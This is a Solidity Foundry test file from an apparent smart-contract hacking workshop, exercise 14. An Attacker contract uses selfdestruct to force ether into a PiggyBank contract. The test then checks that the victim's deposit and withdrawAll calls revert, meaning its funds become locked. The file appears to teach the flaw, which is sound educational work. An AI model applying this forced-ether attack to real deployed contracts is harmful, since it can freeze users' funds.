// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {PiggyBank} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise14_PiggyBank is Test {
    PiggyBank public piggyBank;
    address owner = vm.addr(1);
    Attacker public attacker;

    function setUp() public {
        vm.startPrank(owner);
        piggyBank = new PiggyBank();
        vm.stopPrank();

        attacker = new Attacker();
    }

    function test_withdrawAll() public {
        vm.deal(owner, 10 ether);
        vm.startPrank(owner);
        piggyBank.deposit{value: 1 ether}();
        vm.stopPrank();
        vm.deal(address(this), 20 ether);

        attacker.attack{value: 10 ether}(address(piggyBank));
        assertGt(address(piggyBank).balance, 10 ether);
        vm.startPrank(owner);
        vm.expectRevert();
        piggyBank.deposit{value: 1 ether}();

        vm.stopPrank();

        console.log(address(piggyBank).balance);
        
        vm.expectRevert();
        piggyBank.withdrawAll();
    }
}

contract Attacker {
    function attack(address _victim) external payable {
        selfdestruct(payable(_victim));
    }
}
